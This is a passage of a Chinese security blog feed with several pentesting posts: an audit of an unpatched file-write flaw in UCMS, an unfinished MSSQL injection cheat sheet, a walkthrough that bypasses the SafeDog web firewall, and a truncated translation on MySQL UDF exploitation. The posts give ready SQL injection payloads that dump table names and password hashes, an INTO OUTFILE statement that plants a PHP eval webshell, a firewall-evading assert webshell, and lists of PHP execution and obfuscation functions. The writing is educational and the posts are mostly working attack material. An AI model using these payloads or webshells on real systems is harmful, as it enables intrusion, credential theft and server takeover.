class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;do&apos;])) &#123;</span><br><span class="line">$thisdo=explode(&apos;_&apos;,$_GET[&apos;do&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php require(&apos;top.php&apos;);?&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;do&apos;])) &#123;</span><br><span class="line">if(!isset($thisdo[1])) &#123;</span><br><span class="line">$thisdo[1]=&apos;index&apos;;</span><br><span class="line">&#125;</span><br><span class="line">check_admin_file($thisdo[0],$thisdo[1]);</span><br><span class="line">require($thisdo[0].&apos;/&apos;.$thisdo[1].&apos;.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看下流程，要是 <strong>do</strong> 这个参数是有值的话，就会将do参数的值用 <strong>下划线</strong> 进行分割，返回给 <strong>$thisdo</strong> 这个变量，返回类型是 <strong>数组</strong>。</p><p>我们写个简单的脚本测试一下。<br><img src="/2019/08/01/ucms系统存在代码注入漏洞的分析/ex.png" alt></p><p>然后在代码的后面，会用 require 请求一个脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require($thisdo[0].&apos;/&apos;.$thisdo[1].&apos;.php&apos;)</span><br></pre></td></tr></table></figure></p><p>这里我们的 <strong>do=sadmin_fileedit</strong>，也就是请求 <strong>sadmin/fileedit.php</strong> 脚本</p><p>sadmin/fileedit.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;admin&apos;)) &#123;exit();&#125;</span><br><span class="line">if(power(&apos;alevel&apos;)!=3) &#123;die(&apos;error&apos;);&#125;</span><br><span class="line">if(!AdminFileedit) &#123;</span><br><span class="line">adminmsg(&apos;&apos;,&apos;文件管理功能已关闭&apos;,0);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;dir&apos;])) &#123;</span><br><span class="line">if(empty($_GET[&apos;dir&apos;])) &#123;</span><br><span class="line">$_GET[&apos;dir&apos;]=&apos;/&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$getdir=$_GET[&apos;dir&apos;];</span><br><span class="line">if($_GET[&apos;dir&apos;]==&apos;/&apos;) &#123;</span><br><span class="line">$dir=$_GET[&apos;dir&apos;];</span><br><span class="line">&#125;else &#123;</span><br><span class="line">$dir=$_GET[&apos;dir&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$alldir=$_SERVER[&apos;DOCUMENT_ROOT&apos;].$_GET[&apos;dir&apos;].&apos;/&apos;;</span><br><span class="line">if(stripos($_GET[&apos;dir&apos;],&apos;..&apos;)===false) &#123;&#125;else &#123;die(&apos;error dir&apos;);&#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">die(&apos;no dir&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">$filename=$_GET[&apos;file&apos;];</span><br><span class="line">if(stripos($_GET[&apos;file&apos;],&apos;..&apos;)===false) &#123;&#125;else &#123;die(&apos;error filename&apos;);&#125;</span><br><span class="line">if(!isedit($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">die(&apos;error&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">die(&apos;no file&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&apos;co&apos;])) &#123;</span><br><span class="line">checktoken();</span><br><span class="line">$content=$_POST[&apos;co&apos;];</span><br><span class="line">$fp = @fopen($alldir.$filename,&quot;w&quot;);</span><br><span class="line">if(!@fwrite($fp,$content) &amp;&amp; strlen($content)&lt;&gt;0)&#123;</span><br><span class="line">adminmsg(&apos;&apos;,&apos;写入失败,请修改文件权限&apos;,1);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">$refererurl=&apos;?do=sadmin_fileedit&amp;dir=&apos;.$_GET[&apos;dir&apos;].&apos;&amp;file=&apos;.$_GET[&apos;file&apos;].&apos;&amp;pos=&apos;.$_POST[&apos;pos&apos;];</span><br><span class="line">adminmsg($refererurl,&apos;保存成功&apos;,1,&apos;编辑页&apos;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">if(!is_file($alldir.$filename)) &#123;</span><br><span class="line">$content=&apos;&apos;;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">$content=htmlspecialchars(file_get_contents($alldir.$filename));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里会判断是否请求了 dir、file参数，并没有对参数进行过滤限制，最终传递给 <strong>$alldir $filename</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;dir&apos;])) &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果存在请求 co 参数，那么久会利用 @fopen这个参数打开 ，然后写入 co 中的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;co&apos;])) &#123;</span><br><span class="line">checktoken();</span><br><span class="line">$content=$_POST[&apos;co&apos;];</span><br><span class="line">$fp = @fopen($alldir.$filename,&quot;w&quot;);</span><br><span class="line">if(!@fwrite($fp,$content) &amp;&amp; strlen($content)&lt;&gt;0)&#123;</span><br><span class="line">adminmsg(&apos;&apos;,&apos;写入失败,请修改文件权限&apos;,1);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">$refererurl=&apos;?do=sadmin_fileedit&amp;dir=&apos;.$_GET[&apos;dir&apos;].&apos;&amp;file=&apos;.$_GET[&apos;file&apos;].&apos;&amp;pos=&apos;.$_POST[&apos;pos&apos;];</span><br><span class="line">adminmsg($refererurl,&apos;保存成功&apos;,1,&apos;编辑页&apos;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>你会发现整个过程没有对我们输入的变量进行任何的操作限制(白名单验证、权限限制、重命名啥的)</p><p>这个漏洞好像官方还没有给补丁 ==，并且这个cms版本在17年就没有更新了，可以继续看下审计一波~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文在这里：&lt;a href=&quot;http://blog.topsec.com.cn/%e5%a4%a9%e8%9e%8d%e4%bf%a1%e5%85%b3%e4%ba%8eucms%e7%b3%bb%e7%bb%9f%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90/&quot; title=&quot;http://blog.topsec.com.cn/%e5%a4%a9%e8%9e%8d%e4%bf%a1%e5%85%b3%e4%ba%8eucms%e7%b3%bb%e7%bb%9f%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;天融信关于ucms系统存在代码注入漏洞的分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其实这个漏洞就是后台文件管理的地方可以随意新建文件，而且没有任何的后缀名拦截、白名单验证、权限限制。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Mssql注入实战</title>
    <link href="http://yoursite.com/2019/07/25/Mssql%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/07/25/Mssql注入实战/</id>
    <published>2019-07-25T01:07:22.000Z</published>
    <updated>2019-08-05T06:26:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>没有写完<br><a id="more"></a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>Emmm，mssql默认是存在sysobjects这个表的。</p><p>判断数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;and exists (select * from sysobjects) --//正确</span><br><span class="line">&apos;and exists (select * from mysysobjects) --//&gt;对象名 &apos;mysysobjects&apos; 无效。</span><br></pre></td></tr></table></figure></p><p>基本信息收集：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;and 1=@@version--//数据库</span><br><span class="line">&apos;and 1=host_name()--//主机名</span><br><span class="line">&apos;and 1=@@servername--//服务名</span><br><span class="line">&apos;and 1=db_name()--//当前数据库名</span><br><span class="line">&apos;and 1=user--//当前用户</span><br><span class="line">&apos;and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;))-- //返回正常为sa权限，也就是最高的权限</span><br></pre></td></tr></table></figure></p><p>数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&apos;&apos;))--//一次爆出所有数据库(仅限mssql2005以上)</span><br><span class="line">&apos;and 1=(select &apos;|&apos;%2bname%2b&apos;|&apos; from master..sysdatabases FOR XML PATH(&apos;&apos;))--//一次爆出所有数据库(仅限mssql2005以上)</span><br></pre></td></tr></table></figure></p><p>表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&apos;U&apos; FOR XML PATH(&apos;&apos;))--//一次爆数据库所有表（只限于mssql2005及以上版本）</span><br></pre></td></tr></table></figure></p><p>…..</p><p>后来发现xp_cmdshell启用不了，又很少遇见mssql的站点，所以就去搭了一个mssql的环境，电脑卡死了，搭建了一上午~</p><h1 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h1><p>首先来看一下默认的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">master//存放数据库中的配置信息、用户登陆信息等</span><br><span class="line">model//建立数据库的模板</span><br><span class="line">msdb//记录操作</span><br><span class="line">tempdb//存放临时数据</span><br></pre></td></tr></table></figure></p><p>主要是想看下mssql数据库的账号密码啥的，就去sqlmap里面翻了翻命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;is_dba query=&quot;IS_SRVROLEMEMBER(&apos;sysadmin&apos;)=1&quot; query2=&quot;IS_SRVROLEMEMBER(&apos;sysadmin&apos;,&apos;%s&apos;)=1&quot;/&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">&lt;inband query=&quot;SELECT name FROM master..syslogins&quot; query2=&quot;SELECT name FROM sys.sql_logins&quot;/&gt;</span><br><span class="line">&lt;/users&gt;</span><br><span class="line">&lt;passwords&gt;</span><br><span class="line">&lt;inband query=&quot;SELECT name,master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins&quot; query2=&quot;SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins&quot; condition=&quot;name&quot;/&gt;</span><br><span class="line">&lt;/passwords&gt;</span><br></pre></td></tr></table></figure></p><p>然后运行下命令</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没有写完&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>某dog的一条龙服务</title>
    <link href="http://yoursite.com/2019/07/23/%E6%9F%90dog%E7%9A%84%E4%B8%80%E6%9D%A1%E9%BE%99%E6%9C%8D%E5%8A%A1/"/>
    <id>http://yoursite.com/2019/07/23/某dog的一条龙服务/</id>
    <published>2019-07-23T02:14:40.000Z</published>
    <updated>2019-07-23T08:35:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>从官网上下载的狗狗，环境为apache+php+mysql( 5.5.60)<br><a id="more"></a></p><h1 id="注入Bypass"><a href="#注入Bypass" class="headerlink" title="注入Bypass"></a>注入Bypass</h1><p>判断注入，狗狗对 xor 好像不拦截<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 //拦截</span><br><span class="line">and -1=-1 //不拦截</span><br><span class="line">and ~1=~1 //不拦截</span><br><span class="line">and 1.0=1.0 //拦截</span><br><span class="line">and hex(1)=1 //拦截</span><br><span class="line">and 1 between 1 and 2 //拦截</span><br><span class="line">xor 1=2 //不拦截</span><br></pre></td></tr></table></figure></p><p>注释符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**/ //不拦截</span><br><span class="line">/*!12345*///不拦截</span><br><span class="line">;%00 //不拦截</span><br><span class="line">--+ //不拦截</span><br></pre></td></tr></table></figure></p><p>Bypass很简单，用/<em>%!a</em>/就差不多了，这里我就试一下联合查询</p><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>这个版本的狗狗不拦截order by ，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union/*%!a*/select 1,2,3,4,5</span><br><span class="line"></span><br><span class="line">union/*%!a*/select 1,database(/*%!a*/),3,4,5</span><br><span class="line"></span><br><span class="line">union/*%!a*/select 1,user(/*%!a*/),3,4,5</span><br></pre></td></tr></table></figure></p><p>判断基本信息之后，我们来暴数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*%!a*/select 1,(select table_name from information_schema),3,4,5//拦截</span><br></pre></td></tr></table></figure></p><p>from 后面添加任意字符就拦截了，利用Mysql自带的黑魔法，不拦截<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*%!a*/select 1,(select &#123;x table_name&#125; from information_schema)3,4,5</span><br></pre></td></tr></table></figure></p><p>就可以暴数据了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*%!a*/select 1,(select &#123;x group_concat(table_name)&#125; from information_schema.tables where table_schema=database(/*%!a*/)),3,4,5</span><br></pre></td></tr></table></figure></p><p>Emmmm，后面就依葫芦画瓢，狗狗基本没防御</p><h1 id="狗狗一句话"><a href="#狗狗一句话" class="headerlink" title="狗狗一句话"></a>狗狗一句话</h1><p>这里使用传统的一句话，可以写进去，但是访问的时候被拦截了。前提是该文件有可写权限。。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*%!a*/select 1,&quot;&lt;?php eval($_POST[cc123]) ?&gt;&quot;,3,4,5 into outfile &apos;/var/www/html/shell.php&apos;</span><br></pre></td></tr></table></figure></p><p>然后换了个过狗的一句话，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func(&apos;assert&apos;,$_REQUEST[&apos;kali&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这个就不拦截，成功Bypass，原理就是回调函数，将接收过来的kali参数用assert命令执行，挺简单的。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>命令执行函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eval</span><br><span class="line">assert</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">shell_exec</span><br><span class="line">pcntl_exec</span><br><span class="line">exec</span><br><span class="line">popen</span><br><span class="line">proc_open</span><br></pre></td></tr></table></figure></p><p>动态特性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array_filter</span><br><span class="line">array_map</span><br><span class="line">array_reduce</span><br><span class="line">array_udiff</span><br><span class="line">array_walk</span><br><span class="line">array_walk_recursive</span><br><span class="line">uasort</span><br><span class="line">uksort</span><br><span class="line">create_function</span><br><span class="line">call_user_func</span><br><span class="line">register_shutdown_function</span><br><span class="line">register_tick_function</span><br><span class="line">filter_var</span><br><span class="line">filter_var_array</span><br></pre></td></tr></table></figure></p><p>加密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">base64_decode</span><br><span class="line">gzinflate</span><br><span class="line">gzuncompress</span><br><span class="line">gzdecode</span><br><span class="line">str_replace</span><br><span class="line">str_rot13</span><br><span class="line">preg_replace</span><br><span class="line">preg_filter</span><br><span class="line">chr</span><br></pre></td></tr></table></figure></p><p>其他思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $GET[&apos;a&apos;]($_REQUEST[&apos;kali&apos;]);</span><br></pre></td></tr></table></figure></p><p>url: <a href="http://xxx.com/kali.php?a=assert" target="_blank" rel="noopener">http://xxx.com/kali.php?a=assert</a></p><p>密码：kali</p><p>先放这里，以后说不定要参考一下，狗狗对这块的防护是不足的。</p><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://bbs.ichunqiu.com/article-1024-1.html" target="_blank" rel="noopener">对于Php Shell Bypass思路总结(送给还在迷茫bypass的初学者)</a><br><a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI" target="_blank" rel="noopener">MYSQL_SQL_BYPASS_WIKI</a><br><a href="https://sherlocz.github.io/2019/01/18/killsafedog/" target="_blank" rel="noopener">对安全狗的一次 FUZZ测试</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从官网上下载的狗狗，环境为apache+php+mysql( 5.5.60)&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>译文--MySQL UDF Exploitation</title>
    <link href="http://yoursite.com/2019/07/12/%E8%AF%91%E6%96%87-MySQL-UDF-Exploitation/"/>
    <id>http://yoursite.com/2019/07/12/译文-MySQL-UDF-Exploitation/</id>
    <published>2019-07-12T12:57:35.000Z</published>
    <updated>2019-07-23T03:23:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻译完了才发现Freebuf上也有这篇文章，而且这个技术挺老的了，做个纪念吧 ==</p><ul><li>原文地址：<a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/" target="_blank" rel="noopener">MySQL UDF Exploitation</a><a id="more"></a></li></ul><h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><p>在渗透测试一个金融机构的时候，发现他们的内网是 <strong>MySQL 5.7 64-bit</strong> 的数据库。我发现Sql注入可以从<strong>mysql.user</strong>这个表中把 <strong>username</strong> 和 <strong>password</strong> 脱下来，并且有写入文件的权限。于是就有了写篇文章的的想法，来分享一下用 UDF 进行注入攻击、命令执行、反弹shell的技术。在Google的时候发现Windows系统遇到一些小问题，于是就写下这篇文章，理清一下我的思路，你也可以使用一些小的技巧在 UDF 上面。</p><p>这里使用的数据库是 <strong>MySQL 5.7.21  community server</strong>，(在写这篇文章的时候是最新的版本)。为了重现环境，我这里使用了mysql的 <strong>–secure-file-priv=</strong> 参数设置为空(这里不为空会限制你的发挥，脱裤或者上传文件的时候就很难受了)。在这个实验环境中我可以通过联合查询注入注入出mysql的用户名和密码。发现 MySQL 5.7 版本以上的Mysql，将 <strong>password</strong> 列替换成了 <strong>authentication_string</strong> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># MySQL 5.6一下</span><br><span class="line">select host, user, password from mysql.user;</span><br><span class="line"># MySQL 5.7以上</span><br><span class="line">select host, user, authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/1-intranet.png" alt></p><p>你也可以通过 <strong>metasploit</strong> 的 <strong>mysql_hashdump.rb</strong> 这个模块来把mysql的hash值脱下来，我已经把所需要的脚本修改到可以利用Mysql 5.7 以上的版本，在<a href="https://github.com/rapid7/metasploit-framework/pull/9525" target="_blank" rel="noopener">这里</a></p><p>用户 osanda 可以允许 192.168.0.* 的IP进行连接，所以我们可以利用这个IP范围的机器进行连接，我已经破解了hash，得到了明文(plain text password)</p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/loggin-in.png" alt></p><p>当你登录上Mysql之后，可以看下当前用户的权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.user where user = substring_index(user(), &apos;@&apos;, 1) \G;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/privs-of-osanda.png" alt></p><p>这里我们的用户有所有的权限，可以写入文件，这时你就可以考虑一下利用写入UDF库进行命令执行。</p><h1 id="什么是-UDF库"><a href="#什么是-UDF库" class="headerlink" title="什么是 UDF库"></a>什么是 UDF库</h1><p>UDF即 <strong>User Defined Functions</strong>(用户自定义函数)，你可以在dll文件中自定义函数然后调用到Mysql里面。我们这里会用到<strong> lib_mysqludf_sys_64.dll </strong> ，在 <strong>Metasploit framework</strong> 里面已经有了，你可以在 <strong>/usr/share/metasploit-framework/data/exploits/mysql/</strong> 这个目录下选择对应操作系统和架构(architecture)的 <strong>UDF</strong> 文件。</p><p>(这里我截图了Kali里面的，可能因为我的Kali很久没更新了，这里<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank" rel="noopener">Click Here</a>的UDF文件多一些)</p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/msf.png" alt></p><p>首先我们要确定Mysql的操作系统和架构，我们可以用 <strong>@@version_compile_os</strong> 和 <strong>@@version_compile_machine</strong> 两个参数来查看操作系统和架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| @@version_compile_os | @@version_compile_machine |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| Win64                | x86_64                    |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">MySQL [(none)]&gt; show variables like &apos;%compile%&apos;;</span><br><span class="line">+-------------------------+--------+</span><br><span class="line">| Variable_name           | Value  |</span><br><span class="line">+-------------------------+--------+</span><br><span class="line">| version_compile_machine | x86_64 |</span><br><span class="line">| version_compile_os      | Win64  |</span><br><span class="line">+-------------------------+--------+</span><br></pre></td></tr></table></figure><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/os.png" alt></p><p>从 <strong>MySQL 5.0.67</strong> 开始 UDF 必须包含在 plugin 文件下下面，你可以通过全局变量 <strong>@@plugin_dir</strong> 查看，也可以在 <strong>mysql.ini</strong> 文件夹下修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select @@plugin_dir ;</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">| @@plugin_dir                                                 |</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">| D:\MySQL\mysql-5.7.21-winx64\mysql-5.7.21-winx64\lib\plugin\ |</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">1 row in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; show variables like &apos;plugin%&apos;;</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| Variable_name | Value                                                        |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| plugin_dir    | D:\MySQL\mysql-5.7.21-winx64\mysql-5.7.21-winx64\lib\plugin\ |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/plugin.png" alt></p><p>可以通过 mysqld 下的一个参数进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld.exe –plugin-dir=C:\\temp\\plugins\\</span><br></pre></td></tr></table></figure><p>另外一种方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld.exe --defaults-file=C:\\temp\\my.ini</span><br></pre></td></tr></table></figure></p><p><strong>my.ini</strong> 文件中的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">plugin_dir = C:\\temp\\plugins\\</span><br></pre></td></tr></table></figure></p><p>在 5.0.67 版本之前你要写在操作系统的system用户下， 4.1.25 版本之前也还是一样的，下面是官方声明的文件(为了保持原来的感觉，这里的文档我就不翻译了)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">As of MySQL 5.0.67, the file must be located in the plugin directory. This directory is given by the value of the plugin_dir system variable. If the value of plugin_dir is empty, the behavior that is used before 5.0.67 applies: The file must be located in a directory that is searched by your system’s dynamic linker.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">As of MySQL 4.1.25, the file must be located in the plugin directory. This directory is given by the value of the plugin_dir system variable. If the value of plugin_dir is empty, the behavior that is used before 4.1.25 applies: The file must be located in a directory that is searched by your system’s dynamic 